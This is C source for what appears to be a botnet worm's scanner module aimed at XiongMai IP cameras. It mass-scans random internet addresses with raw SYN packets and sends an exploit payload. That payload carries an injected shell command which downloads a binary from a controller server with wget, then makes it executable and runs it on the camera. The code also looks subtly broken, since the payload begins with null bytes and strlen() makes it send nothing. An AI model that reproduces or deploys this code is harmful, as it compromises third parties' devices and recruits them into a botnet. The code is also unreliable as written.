#ifdef SELFREP

#define _GNU_SOURCE

#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/types.h>
#include <time.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>
#include <string.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#include "includes.h"
#include "xm.h"
#include "table.h"
#include "rand.h"
#include "util.h"
#include "checksum.h"

/* XiongMai (XM) Scanner - targets XM IP cameras */
#define XM_SCANNER_MAX_CONNS 128
#define XM_SCANNER_RAW_PPS 64
#define XM_SCANNER_PORT 34599

int xm_scanner_pid = 0, xm_rsck = 0;
char xm_scanner_rawpkt[sizeof(struct iphdr) + sizeof(struct tcphdr)] = {0};
struct xm_scanner_connection *conn_table;
uint32_t xm_fake_time = 0;

/* XiongMai exploit payload - CVE-2017-16724 */
static char *xm_payload =
    "\x00\x00\x00\x64\x00\x00\x00\x02\x00\x00\x00\x01\x00\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "`cd /tmp; wget http://" HTTP_SERVER_IP "/bins/axis.$(uname -m); chmod +x axis.$(uname -m); ./axis.$(uname -m) &`";

struct xm_scanner_connection {
    int fd;
    ipv4_t dst_addr;
    uint16_t dst_port;
    uint8_t state;
    time_t last_recv;
    char rdbuf[1024];
    int rdbuf_pos;
};

#define XM_SC_CLOSED 0
#define XM_SC_CONNECTING 1
#define XM_SC_EXPLOIT 2

static ipv4_t get_random_xm_ip(void);
static void xm_setup_connection(struct xm_scanner_connection *);

int xm_recv_strip_null(int sock, void *buf, int len, int flags) {
    int ret = recv(sock, buf, len, flags);
    if (ret > 0) {
        for (int i = 0; i < ret; i++) {
            if (((char *)buf)[i] == 0x00) ((char *)buf)[i] = 'A';
        }
    }
    return ret;
}

void xm_scanner_init(void) {
    int i = 0;
    uint16_t source_port;
    struct iphdr *iph;
    struct tcphdr *tcph;

    xm_scanner_pid = fork();
    if (xm_scanner_pid > 0 || xm_scanner_pid == -1) return;

    LOCAL_ADDR = util_local_addr();
    rand_init();
    xm_fake_time = time(NULL);
    
    conn_table = calloc(XM_SCANNER_MAX_CONNS, sizeof(struct xm_scanner_connection));
    for (i = 0; i < XM_SCANNER_MAX_CONNS; i++) {
        conn_table[i].state = XM_SC_CLOSED;
        conn_table[i].fd = -1;
        conn_table[i].rdbuf_pos = 0;
    }

    if ((xm_rsck = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1) {
        exit(0);
    }
    fcntl(xm_rsck, F_SETFL, O_NONBLOCK | fcntl(xm_rsck, F_GETFL, 0));
    i = 1;
    if (setsockopt(xm_rsck, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) != 0) {
        close(xm_rsck);
        exit(0);
    }

    do {
        source_port = rand_next() & 0xffff;
    } while (ntohs(source_port) < 1024);

    iph = (struct iphdr *)xm_scanner_rawpkt;
    tcph = (struct tcphdr *)(iph + 1);

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->id = rand_next();
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = LOCAL_ADDR;

    tcph->source = source_port;
    tcph->dest = htons(XM_SCANNER_PORT);
    tcph->seq = rand_next();
    tcph->doff = 5;
    tcph->syn = TRUE;
    tcph->window = rand_next() & 0xffff;

    while (TRUE) {
        fd_set fdset;
        struct timeval timeo;
        struct sockaddr_in paddr;
        int mfd = 0, nfds;

        FD_ZERO(&fdset);
        FD_SET(xm_rsck, &fdset);
        mfd = xm_rsck;

        for (i = 0; i < XM_SCANNER_MAX_CONNS; i++) {
            if (conn_table[i].state != XM_SC_CLOSED) {
                FD_SET(conn_table[i].fd, &fdset);
                if (conn_table[i].fd > mfd) mfd = conn_table[i].fd;
            }
        }

        timeo.tv_sec = 0;
        timeo.tv_usec = 1000;
        nfds = select(mfd + 1, &fdset, NULL, NULL, &timeo);
        
        if (nfds == -1) break;
        
        if (nfds == 0) {
            struct iphdr *iph = (struct iphdr *)xm_scanner_rawpkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);

            for (i = 0; i < XM_SCANNER_RAW_PPS; i++) {
                iph->id = rand_next();
                iph->daddr = get_random_xm_ip();
                iph->check = 0;
                iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);

                tcph->seq = rand_next();
                tcph->check = 0;
                tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));

                paddr.sin_family = AF_INET;
                paddr.sin_addr.s_addr = iph->daddr;
                paddr.sin_port = tcph->dest;

                sendto(xm_rsck, xm_scanner_rawpkt, sizeof(xm_scanner_rawpkt), MSG_NOSIGNAL, (struct sockaddr *)&paddr, sizeof(paddr));
            }

            for (i = 0; i < XM_SCANNER_MAX_CONNS; i++) {
                struct xm_scanner_connection *conn = &conn_table[i];
                if (conn->state == XM_SC_CLOSED) {
                    conn->dst_addr = get_random_xm_ip();
                    conn->dst_port = XM_SCANNER_PORT;
                    xm_setup_connection(conn);
                    break;
                }
            }
        } else {
            for (i = 0; i < XM_SCANNER_MAX_CONNS; i++) {
                struct xm_scanner_connection *conn = &conn_table[i];
                if (conn->state == XM_SC_CLOSED) continue;

                if (FD_ISSET(conn->fd, &fdset)) {
                    if (conn->state == XM_SC_CONNECTING) {
                        int err = 0;
                        socklen_t err_len = sizeof(err);
                        getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                        if (err != 0) {
                            conn->state = XM_SC_CLOSED;
                            continue;
                        }
                        send(conn->fd, xm_payload, strlen(xm_payload), MSG_NOSIGNAL);
                        conn->state = XM_SC_EXPLOIT;
                        conn->last_recv = xm_fake_time;
                    } else if (conn->state == XM_SC_EXPLOIT) {
                        conn->state = XM_SC_CLOSED;
                    }
                }

                if (conn->state != XM_SC_CLOSED && conn->state != XM_SC_CONNECTING) {
                    int ret = xm_recv_strip_null(conn->fd, conn->rdbuf + conn->rdbuf_pos,
                        sizeof(conn->rdbuf) - conn->rdbuf_pos, MSG_NOSIGNAL);
                    if (ret <= 0) {
                        conn->state = XM_SC_CLOSED;
                        close(conn->fd);
                        conn->fd = -1;
                    } else {
                        conn->rdbuf_pos += ret;
                        conn->last_recv = xm_fake_time;
                    }
                }

                if (conn->state != XM_SC_CLOSED && (xm_fake_time - conn->last_recv) > 30) {
                    conn->state = XM_SC_CLOSED;
                    close(conn->fd);
                    conn->fd = -1;
                }
            }
        }
        xm_fake_time = time(NULL);
    }
}

void xm_kill(void) {
    kill(xm_scanner_pid, 9);
}

static void xm_setup_connection(struct xm_scanner_connection *conn) {
    struct sockaddr_in addr;
    int flags;

    conn->fd = socket(AF_INET, SOCK_STREAM, 0);
    if (conn->fd == -1) {
        conn->state = XM_SC_CLOSED;
        return;
    }

    flags = fcntl(conn->fd, F_GETFL, 0);
    fcntl(conn->fd, F_SETFL, O_NONBLOCK | flags);

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = conn->dst_addr;
    addr.sin_port = htons(conn->dst_port);

    conn->state = XM_SC_CONNECTING;
    conn->last_recv = xm_fake_time;
    conn->rdbuf_pos = 0;
    memset(conn->rdbuf, 0, sizeof(conn->rdbuf));

    connect(conn->fd, (struct sockaddr *)&addr, sizeof(addr));
}

static ipv4_t get_random_xm_ip(void) {
    uint32_t tmp;
    uint8_t o1, o2, o3, o4;

    do {
        tmp = rand_next();
        o1 = tmp & 0xff;
        o2 = (tmp >> 8) & 0xff;
        o3 = (tmp >> 16) & 0xff;
        o4 = (tmp >> 24) & 0xff;
    } while (o1 == 127 || o1 == 0 || o1 == 10 || (o1 == 192 && o2 == 168));

    return INET_ADDR(o1, o2, o3, o4);
}

#endif
